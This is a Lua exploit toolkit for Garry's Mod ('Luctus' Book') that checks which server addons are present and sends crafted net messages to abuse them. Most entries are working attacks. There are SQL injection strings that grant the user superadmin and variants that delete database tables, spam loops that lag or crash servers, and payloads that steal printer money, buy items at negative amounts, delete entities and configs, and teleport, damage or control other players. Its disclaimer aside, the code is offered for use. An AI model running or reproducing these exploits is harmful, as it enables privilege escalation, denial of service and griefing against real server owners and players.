--Luctus' Book
--Made with love by OverlordAkise

--Made to find problems with (darkrp) servers
--Don't you dare ruin servers with this
--Or I will cast ruinga on you

local book = book or {}
book.pages = book.pages or {}
book.recipes = book.recipes or {}

concommand.Add("book", function(ply, cmd, args)
  local arg = args[1]
  local id = tonumber(args[2])
  if (arg == "open") then
    book.open()
    print("recipes:  "..#book.recipes)
    print("pages:    "..#book.pages)
  elseif (arg == "read") then
    for k,v in ipairs(book.pages) do
      print("["..k.."]",v[1],"-",v[2])
    end
  elseif (arg == "all") then
    for k,v in ipairs(book.recipes) do
      print(v[1],"-",v[2])
    end
  elseif (arg == "cook" and id and book.pages[id] and book.pages[id][4]) then
    book.pages[id][4]()
    print("Cooking")
  elseif (arg == "finish" and id and book.pages[id] and book.pages[id][5]) then
    book.pages[id][5]()
    print("Done")
  else
    print("?")
  end
end)

local function addPage(name,desc,findFunc,startFunc,endFunc)
  table.insert(book.recipes, {name,desc,findFunc,startFunc,endFunc})
end

function book.open()
  book.pages = {}
  for k,v in ipairs(book.recipes) do
    if v[3]() then
      table.insert(book.pages,v)
    end
  end
end

addPage("Adds auto jump",
  "You gotta have fun right? Test if they stop you",
  function()
    return true
  end,
  function()
    hook.Add("CreateMove","wjdksai",function(cmd)
      if bit.band( cmd:GetButtons(), IN_JUMP ) ~= 0 and not LocalPlayer():IsOnGround() then
        cmd:SetButtons( bit.band( cmd:GetButtons(), bit.bnot( IN_JUMP ) ) )
      end
    end)
  end,
  function()
    hook.Remove("CreateMove","wjdksai")
  end
)


addPage("Extreme Tickrate", 
  "Too high tickrate with more than 40",
  function()
    return (1 / engine.TickInterval()) > 40
  end,
  function()
    print("A high tickrate makes the server unstable!")
    print("This means easy crashes with ragdolls and props!")
    print("DarkRP should have (max) 33 ticks")
    print("Or, if laggy, 22 / 16 ticks")
  end,
  nil
)


addPage("Allowing CS in DarkRP", 
  "The Server allows the use of disallowCS",
  function()
    return GetConVar("sv_allowcslua"):GetInt() ~= 0
  end,
  function()
    print("To use this: Execute files in your garrysmod/lua folder with the following command:")
    print("lua_openscript_cl myscript.lua")
  end,
  nil
)


addPage("SCP714 Ring Spawner", 
  "Server doesn't check if you wear the ring, you can drop infinite rings",
  function()
    return GetConVar("scp714_kill")
  end,
  function()
    net.Start("Drop714")
    net.SendToServer()
  end,
  nil
)

addPage("SCP178 Spawner", 
  "Server doesn't check if you have SCP178, you can spawn infinite",
  function()
    return util.NetworkIDToString(util.NetworkStringToID("Drop178")) == "Drop178"
  end,
  function()
    net.Start("Drop178")
    net.SendToServer()
  end,
  nil
)


addPage("VJBase Spawn bug", 
  "Only works if you have a toolgun and run the console command 'gmod_toolmode vjstool_npcspawner'",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "vj_npcspawner_sv_create" )) == "vj_npcspawner_sv_create"
  end,
  function()
    net.Start("vj_npcspawner_sv_create")
      local t = {}
      t.vjstool_npcspawner_playsound = 0
      t.vjstool_npcspawner_nextspawntime = 1
      net.WriteTable(t)
      net.WriteVector(LocalPlayer():GetEyeTrace().HitPos+Vector(0,0,60))
      local tlines = {}
      table.insert(tlines,{Entities="npc_metropolice",SpawnPosition=Vector(0,0,0),WeaponsList="default",EntityName="Metro Police"})
      net.WriteType(tlines)
      net.WriteString("RightClick")
    net.SendToServer()
  end,
  nil
)


addPage("No FPS Boost", 
  "gmod_mcore_test is not 1",
  function()
    return GetConVar("gmod_mcore_test"):GetInt() == 0
  end,
  function()
    RunConsoleCommand("gmod_mcore_test", 1)
  end,
  nil
)


addPage("FreeBodygroupr bug", 
  "You can set your playermodel to any model you want (eg. a plane)",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "update_store_freebodygroupr" )) == "update_store_freebodygroupr"
  end,
  function()
    net.Start( "update_store_freebodygroupr" )
      net.WriteInt( -10, 32 )
      net.WriteInt( -10, 32 )
      net.WriteString( "models/xqm/jetbody3_s5.mdl" )
    net.SendToServer()
  end,
  nil
)


addPage("Defconsystem bug", 
  "Set the defcon text and level to anything you want as a user",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "DefconSys1" )) == "DefconSys1"
  end,
  function()
    local Defcon = {
      level = "Aqua is waifu",
      reason = "Aqua is waifu",
      author = "Aqua is waifu",
    }
    net.Start("DefconSys1")
    net.WriteTable(Defcon)
    net.SendToServer()
  end,
  nil
)


addPage("ulx votemap", 
  "You can use ulx votemap to change the map",
  function()
    if (ULib and ULib.ucl and ULib.ucl.query) then
      return ULib.ucl.query(LocalPlayer(),"ulx votemap")
    else
      return false
    end
  end,
  function()
    print("Simply do !menu and vote for a different map with 2 friends")
  end,
  nil
)

addPage("KShop bug", 
  "You can buy ANY item from anywhere on the map for free",
  function()
    return KShop
  end,
  function()
    net.Start("KS_BuyItem")
      net.WriteTable({price=1,typ="weapon",item="weapon_crowbar"})
    net.SendToServer()
  end,
  nil
)


addPage("ceto_tickets sql injection", 
  "Become superadmin with fadmin for free!",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "TicketSystem:CreateAnswer" )) == "TicketSystem:CreateAnswer"
  end,
  function()
    print("To do this: Open a ticket and comment the following text into it as a comment:")
    print("Testing sa!', '93'); INSERT INTO FAdmin_PlayerGroup(steamid, groupname) VALUES('"..LocalPlayer():SteamID().."','superadmin');--")
  end,
  nil
)


addPage("charsys sql injection", 
  "Become superadmin with fadmin for free!",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "CharSystemCreateProfile" )) == "CharSystemCreateProfile"
  end,
  function()
    net.Start("CharSystemCreateProfile")
      net.WriteUInt(1, 8)
      net.WriteString("Peter Hustensaft'; INSERT INTO FAdmin_PlayerGroup(steamid, groupname) VALUES(\""..LocalPlayer():SteamID().."\",\"superadmin\");--")
      --net.WriteString("Peter Husten'; UPDATE charsys SET money = 999999999;--")
      --net.WriteString("Peter Husten'; DELETE FROM FPP_BLOCKEDMODELS1;--")
      --net.WriteString("Peter Husten'; DELETE FROM FPP_BLOCKED1;--")
    net.SendToServer()
  end,
  nil
)


addPage("gdeathsystem teleports", 
  "Teleport players with the defib! (Only works if you have it as your active weapon)",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "Medic.SendRagdollRequest" )) == "Medic.SendRagdollRequest"
  end,
  function()
    for k,v in ipairs(player.GetAll()) do
      net.Start("Medic.SendRagdollRequest")
        net.WriteEntity(v)
        net.WriteVector(Vector(0,0,0))
      net.SendToServer()
    end
  end,
  nil
)


addPage("List DarkRP jobs",
  "You could access darkrp jobs with their commands bypassing F4 restrictions",
  function()
    return DarkRP
  end,
  function()
    for k,v in ipairs(RPExtraTeams) do
      print(v.name," -> ",v.command)
    end
  end,
  nil
)


addPage("Propspawning still on",
  "The SpawnMenu is probably disabled, but according to the darkrp config you should still be able to spawn props",
  function()
    return (DarkRP and GAMEMODE.Config.propspawning and not hook.Call("SpawnMenuOpen",GAMEMODE))
  end,
  function()
    print("Simply type 'gm_spawn <model>' in your console to spawn props without a spawnmenu")
  end,
  nil
)


addPage("Thirdperson bug",
  "You can use thirdperson for looking through walls",
  function()
    return GetConVar("simple_thirdperson_enabled")
  end,
  function()
    print("Hold C and turn on thirdperson, then go to the camera setting and disable camera collision")
    print("Now your thirdperson camera can look through walls and spot hidden enemies")
  end,
  nil
)


addPage("ulx motd gdrive",
  "32bit gmod (default) doesn't support google drive websites (found in ulx_motdurl)",
  function()
    local cv = GetConVar("ulx_motdurl")
    return (cv and string.find(cv:GetString(),"google") ~= nil)
  end,
  function()
    print("Tell the server owner that they should not host their rules on a google drive document")
  end,
  nil
)


addPage("sleep door glitch",
  "You could push other people through doors because /sleep is still enabled",
  function()
    if not DarkRP then return false end
    local disDefault = DarkRP and (DarkRP.disabledDefaults["modules"]["sleep"] == false) or false
    local command = DarkRP.getChatCommands() and (DarkRP.getChatCommands()["sleep"] ~= nil) or false
    return (disDefault and command)
  end,
  function()
    print("Do /sleep near a door (but not too close) and let other people push/gravgun/punch you through the door")
  end,
  nil
)

--[[
--The ConVar is serverside only, so this is not working
addPage("sit anywhere invincibility",
  "Damage during sitting is not enabled, thus making you invincible if you sit",
  function()
    local cv = GetConVar("sitting_can_damage_players_sitting")
    return (cv and cv:GetInt() ~= 1 or false)
  end,
  function()
    print("Simply sit down and become invincible against any kind of damage")
  end,
  nil
)
--]]


addPage("sit anywhere + nocollide props",
  "Sit on a prop, nocollide it and move through doors",
  function()
    return (DarkRP and GAMEMODE.Config.allowedProperties.collision and GetConVar("sitting_use_walk"))
  end,
  function()
    print("Sit on a prop, nocollide it and move through doors")
  end,
  nil
)


addPage("/buy still works",
  "You can still buy pistols as a civilian (cook for list)",
  function()
    return (DarkRP and GAMEMODE.Config.enablebuypistol and not GAMEMODE.Config.restrictbuypistol)
  end,
  function()
    print("Type in the chat '/buy <name>':")
    for k,v in ipairs(CustomShipments or {}) do
      if not v or not v.separate or not v.name then return end
      print(v.name)
    end
  end,
  nil
)


addPage("gProtect 2player boogaloo",
  "gProtect won't fix prop-lag if the props belong to different players",
  function()
    return gProtect
  end,
  function()
    print("gProtect is worse than gm_apg. Recommend them gm_apg.")
    print("Possible Bugs: ")
    print("2 players can spawn props inside each others for server lagging")
    print("You can use /sleep or a tazer to ragdoll ontop of props and thus removing them")
    print("Cars could break if you lift them up")
  end,
  nil
)


addPage("DarkRP drop allowed",
  "The DarkRP DisallowDrop list has only default elements or dropspawnedweapons is true",
  function()
    return DarkRP and (table.Count(GAMEMODE.Config.DisallowDrop) == 14 or GAMEMODE.Config.dropspawnedweapons)
  end,
  function()
    print("You could probably drop all police weapons and use them as a civilian")
  end,
  nil
)


addPage("DarkRP buyammo",
  "You could probably buy ammo with /buyammo (cook for list)",
  function()
    return (DarkRP and GAMEMODE.AmmoTypes and table.Count(GAMEMODE.AmmoTypes) > 0 and not GAMEMODE.Config.noguns)
  end,
  function()
    print("Simply type in chat '/buyammo pistol' and you should spawn ammo infront of you")
    PrintTable(GAMEMODE.AmmoTypes)
  end,
  nil
)


addPage("not enough textscreens",
  "Only 1 textscreen is not enough (for DarkRP)",
  function()
    local cv = GetConVar("sbox_maxtextscreens")
    return (cv and cv:GetInt() <= 1)
  end,
  function()
    print("Not enough textscreens for users to use (probably)")
  end,
  nil
)


addPage("employers job changer", 
  "Become every job you want via an Employers addon NPC",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "em_become" )) == "em_become"
  end,
  function()
    net.Start("em_become")
      net.WriteUInt(3,8)
    net.SendToServer()
  end,
  nil
)

--[[
--This one didn't work correctly!
--It calculates your own addons + the server addons
addPage("download size too big",
  "The download size when joining the server is too much (>4GB)!",
  function()
    local en = engine.GetAddons()
    table.sort( en, function(a, b) return a["size"] > b["size"] end )
    local together = 0
    for k,v in pairs(en) do
      together = together + v["size"]
    end
    return together > 4000000000
  end,
  function()
    
    local en = engine.GetAddons()
    table.sort( en, function(a, b) return a["size"] > b["size"] end )
    local together = 0
    for k,v in pairs(en) do
      print(v["title"] .. " -> " .. string.NiceSize(v["size"]))
      together = together + v["size"]
    end
    print("---")
    print("The current download size for new players is too big!")
    print("Downloadsize: "..string.NiceSize(together))
    print("Above are all the addons, sorted by filesize decreasing.")
  end,
  nil
)
--]]


--New for v2.1 (2022.06.19)

addPage("set defon level", 
  "They don't check who is changing the defcon, or what you change it to",
  function()
    return DataPads and DataPads.SendRequest
  end,
  function()
    Datapads:SendRequest(1,"changeagenda","sadness")
    Datapads:SendRequest(1,"changedefcon",1)
  end,
  nil
)

addPage("ulx notepad", 
  "You can read the ulx notepad as a user",
  function()
    return usermessage.GetTable()["OpenMenuReadOnly"] and MenuOpenReadOnly and util.NetworkIDToString(util.NetworkStringToID( "GetContents" )) == "GetContents"
  end,
  function()
    MenuOpen()
    net.Start( "GetContents" )
      net.WriteFloat( 1 )
    net.SendToServer()
  end,
  nil
)

addPage("adminpopups close all tickets", 
  "You can close any ticket, effectively disabling the addon by spamming 'close' for all players",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "ASayPopupClaim" )) == "ASayPopupClaim"
  end,
  function()
    timer.Create("remove_error_models", 0.5, 0, function()
        for k,ply in ipairs(player.GetHumans()) do
            net.Start("ASayPopupClaim")
                net.WriteEntity(ply)
            net.SendToServer()
        end
    end)
  end,
  function()
    timer.Remove("remove_error_models")
  end
)

addPage("sitanywhere bug through walls", 
  "If sitanywhere is installed via workshop: You can bug yourself through walls and windows",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "SitAnywhere" )) == "SitAnywhere"
  end,
  function()
    print("How-To: Simply sit down on a window bench, have another player stand crouching inside you")
    print("And then stand up, if done correctly you will be teleported through the wall")
  end,
  nil
)

addPage("[OLD] create admin announcements", 
  "adminannouncement addon lets anyone announce (probably fixed)",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "announcementadmin" )) == "announcementadmin"
  end,
  function()
    net.Start("announcementadmin")
        net.WriteString("!THIS IS A TEST ANNOUNCEMENT!")
        net.WriteString("10")
    net.SendToServer()
  end,
  nil
)

addPage("summe nextbots entity spawner", 
  "SummeNextbots allows any user to spawn any entity from a net message created entity spawner. (Spawns at eyepos)",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "SummeNextbots.SpawnDispenser" )) == "SummeNextbots.SpawnDispenser"
  end,
  function()
    net.Start("SummeNextbots.SpawnDispenser")
        net.WriteVector(LocalPlayer():GetEyeTrace().HitPos+Vector(0,0,20))
        net.WriteTable({["manhack_welder"] = 1, ["weapon_smg1"] = 1})
        net.WriteString("models/Kleiner.mdl")
        net.WriteUInt(100,15)
        net.WriteBool(false)
    net.SendToServer()
  end,
  nil
)

addPage("balou's ragdollspawner spawner",
  "You can spawn prop_dynamics via net messages. (Spawns gman at your eyepos)",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "SlashOursToolSpawn" )) == "SlashOursToolSpawn"
  end,
  function()
    net.Start("SlashOursToolSpawn")
        net.WriteAngle(Angle(0,0,0))
        net.WriteVector(LocalPlayer():GetEyeTrace().HitPos+Vector(0,0,20))
        net.WriteString("models/gman_high.mdl")
        net.WriteString("sitpose")
    net.SendToServer()
  end,
  nil
)

addPage("ulxcc write to notepad",
  "ULXCustomCommands doesn't check who writes into their notepad",
  function()
    return usermessage.GetTable()["OpenMenuReadOnly"] and MenuOpenReadOnly and util.NetworkIDToString(util.NetworkStringToID( "WriteQuery" )) == "WriteQuery"
  end,
  function()
    net.Start("WriteQuery")
      net.WriteString("MY GOODNESS; WHO IS COOKING HERE?")
    net.SendToServer()
  end,
  nil
)

--[[
--TODO: symfphys spammable?
net.Receive("simfphys_request_ppdata" ... local ent = net.ReadEntity()
--TODO: Maybe spawn symfphys with concommand? Couldnt test yet
concommand.Add( "simfphys_spawnvehicle", function( ply, cmd, args ) SpawnSimfphysVehicle( ply, args[1] ) end )
	local VehicleList = list.Get( "simfphys_vehicles" )
	local vehicle = VehicleList[ vname ]
--]]



--New for v2.3 (2023.07.09)
addPage("character_creator instant respawn",
  "CharacterCreator lets you respawn instantly by deleting any character (slot3)",
  function()
    return CharacterCreator
  end,
  function()
    net.Start("CharacterCreator:DeleteCharacterClient")
      net.WriteInt(3,8)
    net.SendToServer()
    timer.Simple(0.4,function()
      if IsValid(CharacterFrameBaseParent) then
        CharacterFrameBaseParent:Close()
        gui.EnableScreenClicker(false)
      end
    end)
  end,
  nil
)

addPage("Solve-npc-store infinite money",
  "The 'Solve' Server's Store NPC doesn't check if you buy negative amounts",
  function()
    return Solve and Solve.Store and Solve.Store.List
  end,
  function()
    local jobname = team.GetName(LocalPlayer():Team())
    local found = nil
    local allowed = {}
    for k,store in pairs(Solve.Store.List) do
        if found then break end
        if not store.content then continue end
        for k,wep in pairs(store.content) do
            if not wep.jobs then continue end
            for k,job in pairs(wep.jobs) do
                if job.Name then
                    if job.Name == jobname then
                        found = wep.classname
                    end
                    allowed[job.Name] = true
                end
                
            end
        end
    end
    if not found then
        print("ERROR: No suitable weapon found.")
        print("Please switch to one of the following jobs:")
        PrintTable(allowed)
        return
    end
    net.Start("Solve:Store:NPC:Buy")
        net.WriteTable({
            {Price=1,Amount=-333232,Class=found}
        })
    net.SendToServer()
  end,
  nil
)

addPage("create eggshell-burst effect",
  "Wherever you look there will be an eggshell explosion",
  function()
    return HATCH_CRACK_3
  end,
  function()
    net.Start("EggNetwork")
      net.WriteVector(LocalPlayer():GetEyeTrace().HitPos)
      net.WriteInt(127,8)
    net.SendToServer()
  end,
  nil
)

addPage("delete entity",
  "Delete the entity you are looking at because the StandPose addon doesn't check it",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "StandPose_Server" )) == "StandPose_Server"
  end,
  function()
    net.Start("StandPose_Server")
      net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
      net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
    net.SendToServer()
  end,
  nil
)

addPage("scp939 lay egg",
  "You can lay an egg as a non-scp if you have > 4 frags",
  function()
    return LocalPlayer().GetPlayersInView
  end,
  function()
    if LocalPlayer():Frags() < 5 then
      print("You need atleast 5 kills!")
      return
    end
    net.Start("SCP_939_LAYEGG")
    net.SendToServer()
  end,
  nil
)

addPage("ADC change your name to nothing",
  "AdenCharacterSystem doesn't check your name length",
  function()
    return Aden_DC
  end,
  function()
    net.Start("ADC::UpdateName")
      net.WriteUInt(1,8)
      net.WriteUInt(1,8)
      net.WriteString("")
      net.WriteString("")
    net.SendToServer()
  end,
  nil
)

addPage("make others emote",
  "You can make others do animations via the animations_menu addon",
  function()
    return net.Receivers["sw::amenu::openMainMenu"]
  end,
  function()
    net.Start("sw::amenu::setBonesAngle")
      net.WriteEntity(LocalPlayer())
      net.WriteInt(1,15) --this is custom
    net.SendToServer()
  end,
  nil
)

addPage("employer npc switch to any job",
  "The employer npc may allow you to switch to any job it doesn't allow you to",
  function()
    return ENPC
  end,
  function()
    net.Start("ENPC.ChangeJobNPC")
      net.WriteInt(3,16)
      net.WriteInt(1,16)
    net.SendToServer()
  end,
  nil
)

addPage("CH ATM color change",
  "You can change the color of any CH ATM on the map, this changes the one you look at",
  function()
    return CH_ATM
  end,
  function()
    net.Start("CH_ATM_Net_ChangeATMColor")
      net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
      net.WriteColor(Color(math.random(1,255),math.random(1,255),math.random(1,255)))
      net.WriteUInt(999,10)
    net.SendToServer()
  end,
  nil
)

addPage("unfreeze yourself (RealisticPolice)",
  "RealisticPolice just lets you unfreeze yourself anytime you want (doesnt fix :Lock)",
  function()
    return Realistic_Police
  end,
  function()
    net.Start("RealisticPolice:FiningSystem")
      net.WriteString("RefuseFine")
      net.WriteString("a§b§c")
    net.SendToServer()
  end,
  nil
)

addPage("slowly create lag (RealisticPolice)",
  "RealisticPolice cameras allow you to set NW strings",
  function()
    return Realistic_Police
  end,
  function()
    local all = ents.GetAll()
    local c = 0
    local str = ""
    for i=1,12000 do
      str = str .. i
    end
    timer.Create("aaa",0.2,0,function()
      net.Start("RealisticPolice:NameCamera")
        net.WriteEntity(all[c])
        net.WriteString(str)
      net.SendToServer()
      c = c + 1
    end)
  end,
  function()
    timer.Remove("aaa")
  end
)

addPage("SCP106 sink-into-ground",
  "Some 106 swep lets you sink into the ground and (if set) TP you to the 106 chamber",
  function()
    return hook.GetTable()["RenderScreenspaceEffects"] and hook.GetTable()["RenderScreenspaceEffects"]["scp.049iview"] or false
  end,
  function()
    net.Start("106teleport")
    net.SendToServer()
  end,
  nil
)

addPage("DragonVape fire",
  "Set on fire whatever you are looking at (You have to have a dragon vape for this)",
  function()
    return vape_interpolate_arm
  end,
  function()
    net.Start("DragonVapeIgnite")
      net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
    net.SendToServer()
  end,
  nil
)

addPage("TFA BO3 Remove ply's ragdoll",
  "Delete a players ragdoll, making them un-revivable (this example deletes yours)",
  function()
    return TFA and TFA.BO3NoModSound
  end,
  function()
    net.Start("TFA.BO3.REMOVERAG")
      net.WriteEntity(LocalPlayer())
    net.SendToServer()
  end,
  nil
)

addPage("Hide your name on the Scoreboard",
  "Changes your name on the scoreboard to be hidden (RogueScoreboard addon)",
  function()
    return RogueScoreboard
  end,
  function()
    net.Start("Scoreboard.Hidden")
    net.SendToServer()
  end,
  nil
)

addPage("Set jobspawns for any job anywhere",
  "This sets your job spawn on your current position (zk_drp addon)",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "zk_drp_setspawns_save_selected" )) == "zk_drp_setspawns_save_selected"
  end,
  function()
    local myteam = LocalPlayer():Team()
    net.Start("zk_drp_setspawns_save_selected")
      net.WriteTable({myteam,myteam,myteam,myteam,myteam,myteam,myteam})
      net.WriteVector(LocalPlayer():GetPos())
    net.SendToServer()
  end,
  nil
)

addPage("Pocket enabled",
  "You may be able to pocket things you shouldnt be able to",
  function()
    if not DarkRP or not RPExtraTeams then return false end
    if GAMEMODE and GAMEMODE.Config and GAMEMODE.Config.DefaultWeapons and table.HasValue(GAMEMODE.Config.DefaultWeapons,"pocket") then return true end
    for k,job in ipairs(RPExtraTeams) do
      if table.HasValue(job.weapons,"pocket") then return true end
    end
    return false
  end,
  function()
    print("Jobs which have a 'pocket':")
    if table.HasValue(GAMEMODE.Config.DefaultWeapons,"pocket") then print("Every job has a pocket") return end
    for k,job in ipairs(RPExtraTeams) do
      if table.HasValue(job.weapons,"pocket") then print(job.name) end
    end
  end,
  nil
)

addPage("Custom jobnames possible",
  "You can use /job to rename yourself to your own 'jobs'",
  function()
    return DarkRP and GAMEMODE and GAMEMODE.Config and GAMEMODE.Config.customjobs
  end,
  function()
    print("Set your job name with /job xxx")
  end,
  nil
)

addPage("JMod friendlist spam",
  "Stutter the server by requesting your friends 3000 times at once",
  function()
    return JMod and JMod.ClientConfig
  end,
  function()
    net.Start("JMod_Friends")
      local tab = {}
      for i=1,3000 do
        table.insert(tab,LocalPlayer())
      end
      net.WriteTable(tab)
    net.SendToServer()
  end,
  nil
)

addPage("Att-Vendor loadout spawner",
  "You can get your spawn-weapons again via attachment vendor",
  function()
    return ATTACHMENT_VENDOR
  end,
  function()
    net.Start("attvend_ready")
    net.SendToServer()
  end,
  nil
)

addPage("Force-Emote all players",
  "You can force all other players to emote (e.g. salute)",
  function()
    return amenu and amenu.anim
  end,
  function()
    for k,v in ipairs(player.GetAll()) do
      net.Start("sw::amenu::setBonesAngle")
        net.WriteEntity(v)
        net.WriteInt(1,15)
      net.SendToServer()
    end
  end,
  nil
)

addPage("Troll cookingmod message",
  "You can show other players a message that their food is ready",
  function()
    return CookingMod and CookingMod.Config
  end,
  function()
    net.Start("CookingMod:OrderReady")
      net.WriteEntity(LocalPlayer())
    net.SendToServer()
  end,
  nil
)

addPage("Enable spawnmenu again",
  "Not really an exploit, but you can do it anyways",
  function()
    return not hook.Run("SpawnMenuOpen")
  end,
  function()
    for k,v in pairs(hook.GetTable()["SpawnMenuOpen"]) do
      hook.Remove("SpawnMenuOpen",k)
    end
    function GAMEMODE:SpawnMenuOpen() return true end
    for k,v in pairs(hook.GetTable()["ContextMenuOpen"]) do
      hook.Remove("ContextMenuOpen",k)
    end
    function GAMEMODE:ContextMenuOpen() return true end
  end,
  nil
)

addPage("Remove entities with FPP",
  "Remove the entity you are looking at because of FPP TOOLGUN worldprops true",
  function()
    if util.NetworkIDToString(util.NetworkStringToID("properties")) ~= "properties" then return false end
    if GAMEMODE and GAMEMODE.Config and GAMEMODE.Config.allowedProperties and not GAMEMODE.Config.allowedProperties.remover then return false end
    if not FPP then return true end
    if FPP and FPP.Settings and FPP.Settings.FPP_TOOLGUN1 and FPP.Settings.FPP_TOOLGUN1.worldprops and FPP.Settings.FPP_TOOLGUN1.worldprops==1 then return true end
    return false
  end,
  function()
    net.Start("properties")
      net.WriteString("remove")
      net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
    net.SendToServer()
  end,
  nil
)

addPage("SquadSystem demote others",
  "You can demote people in other squads without being in it (this demotes infront of you)",
  function()
    return SquadSystem and SquadSystem.Config
  end,
  function()
    net.Start("SquadSystem.RequestPositionChange")
      net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
      net.WriteInt(3,8)
    net.SendToServer()
  end,
  nil
)

addPage("Defib damage",
  "You need the 'weapon_defibrillator' in hand for this to work, can damage any player",
  function()
    return util.NetworkIDToString(util.NetworkStringToID("defibgiveents")) == "defibgiveents"
  end,
  function()
    net.Start("defibgiveents")
      net.WriteBool(false)
      net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
      net.WriteVector(LocalPlayer():GetPos())
    net.SendToServer()
  end,
  nil
)

addPage("WarningSystem7452em serverlag",
  "Lag the server by requesting to see your warnings 90.000 times",
  function()
    return WarningSystem7452em
  end,
  function()
    local tab = {}
    for i=1,90000 do
      table.insert(tab,"warnings")
    end

    local tbl, iLen = WarningSystem7452em:Compress({
      ["target"] = LocalPlayer():SteamID64(),
      ["types"] = tab,
    })

    net.Start("WarningSystem7452em:7452")
      net.WriteString("WarningSystem7452em:Player:GetInfo")
      net.WriteUInt(iLen, 32)
      net.WriteData(tbl, iLen)
    net.SendToServer()
  end,
  nil
)

addPage("LVS use-through-objects",
  "You can 'press E' on anything that is in 124 units distance from you",
  function()
    return scripted_ents.Get("lvs_base_doorhandler")
  end,
  function()
    for k,v in ipairs(ents.FindInSphere(LocalPlayer():GetPos(),125)) do
      net.Start("lvs_doorhandler_interact")
        net.WriteEntity(v)
      net.SendToServer()
    end
  end,
  nil
)

addPage("Grab all printer money (adv)",
  "You can collect money from all advanced moneyprinters on the map",
  function()
    return scripted_ents.Get("adv_moneyprinter")
  end,
  function()
    for k,v in ipairs(ents.FindByClass("adv_moneyprinter")) do
      net.Start("DataSend")
        net.WriteFloat(2)
        net.WriteEntity(v)
        net.WriteEntity(LocalPlayer())
      net.SendToServer()
    end
  end,
  nil
)

addPage("Grab all printer money (fg)",
  "You can collect money from all fg printers on the map",
  function()
    return util.NetworkIDToString(util.NetworkStringToID("fg_printer_money")) == "fg_printer_money"
  end,
  function()
    for k,v in ipairs(ents.FindByClass("fg_printer_money")) do
      net.Start("DataSend")
        net.WriteEntity(v)
      net.SendToServer()
    end
  end,
  nil
)

addPage("Give any entity",
  "The 'scrapsystem' doesn't verify what you are crafting",
  function()
    return NPCShopMenu and scrapcost2
  end,
  function()
    net.Start("wep")
      net.WriteString("lockpick")
      net.WriteString("lockpick")
      net.WriteInt(0, 32)
    net.SendToServer()
  end,
  nil
)

addPage("Teleport yourself",
  "The 'TARDIS' addon lets you teleport anyone anywhere",
  function()
    return TARDIS
  end,
  function()
    net.Start("TARDIS-Pointer-Debug-Update")
      net.WriteEntity(LocalPlayer())
      net.WriteString("pos")
      net.WriteVector(LocalPlayer():GetEyeTrace().HitPos+Vector(0,0,10))
    net.SendToServer()
  end,
  nil
)

--new 20240622

addPage("Spam chat with kicks",
  "Prints a msg into chat like <1.player failed the test and was kicked>",
  function()
    return RE_Questions and RE_Answers and RE_CorrectAnswers
  end,
  function()
    net.Start("KickMSG")
      net.WriteEntity(Entity(1))
    net.SendToServer()
  end,
  nil
)

addPage("Change config of mvp's addons",
  "Able to change any config value in any of mvp's addons",
  function()
    return mvp and mvp.config and mvp.config.Get
  end,
  function()
    net.Start("mvp.config.ChangeValue")
      net.WriteString("servername")
      net.WriteType("Big Dummy")
    net.SendToServer()
  end,
  nil
)

addPage("Delete summe's WeaponWeights config",
  "No checks, anyone can delete weaponbox configs",
  function()
    return WeaponWeights and WeaponWeights.Config and WeaponWeights.Config.Weapons
  end,
  function()
    for k,v in pairs(WeaponWeights.Config.Weapons) do
      net.Start("WeaponWeights.DeleteEdit")
        net.WriteUInt(k,16)
      net.SendToServer()
    end
  end,
  nil
)

addPage("Set any plymodel (closetter)",
  "You need to be close enough to a closetter closet, may not work",
  function()
    return LDT_Closetter and LDT_Closetter.Config
  end,
  function()
    net.Start("LDT_Closetter.SetModel")
      --This exploit works, but doesn't work with this example because of random-like IDs here
      --If you spam through the first ~20 IDs until you find your closet infront of you it will work
      net.WriteInt(1,9)
      net.WriteString("models/props_phx/construct/metal_plate_curve360.mdl")
      net.WriteEntity(LocalPlayer())
    net.SendToServer()
  end,
  nil
)

addPage("Remove all conquest points",
  "RepublicConquest:ClearAll(), may create a bit of lag?",
  function()
    return RepublicConquest and RepublicConquest.Point
  end,
  function()
    net.Start("RepublicConquest_SyncServerRemovalAll")
    net.SendToServer()
  end,
  nil
)

addPage("Remove all triggers",
  "RepublicTriggers:WipeTriggers()",
  function()
    return RepublicTriggers and RepublicTriggersEffect
  end,
  function()
    net.Start("RepublicTriggers_SyncServerRemovalAll")
    net.SendToServer()
    --[[
    --To delete everything, even the data/ saved ones:
    net.Start("RepublicTriggers_Fetch")
    net.SendToServer()
    timer.Simple(1,function()
      for k,v in pairs(RepublicTriggersEffect) do
        net.Start("RepublicTriggers_Delete_SERVER")
          net.WriteUInt(k,16)
        net.SendToServer()
      end
    end)
    --]]
  end,
  nil
)

addPage("Potential server crash",
  "This spawns whatever you sent and despawns it instantly again",
  function()
    return NCS_REQUISITION and NCS_REQUISITION.CFG
  end,
  function()
    net.Receive("NCS_REQUISITION_RetrieveModel",function()
      print(net.ReadString())
    end)
    net.Start("NCS_REQUISITION_RetrieveModel")
      net.WriteString("worldspawn")
    net.SendToServer()
  end,
  nil
)

addPage("Namechanger (voidchar)",
  "This can change your name to anything, no checks or validations (e.g. '')",
  function()
    return VoidChar and VoidChar.Config
  end,
  function()
    net.Start("VoidChar.ChangeIdentity")
      net.WriteString("Gustav Gulasch")
      net.WriteString(LocalPlayer():GetModel())
      net.WriteTable({})
    net.SendToServer()
  end,
  nil
)

print("+------+")
print("|luctus|")
print("| book |")
print("| v2.4 |")
print("+------+")
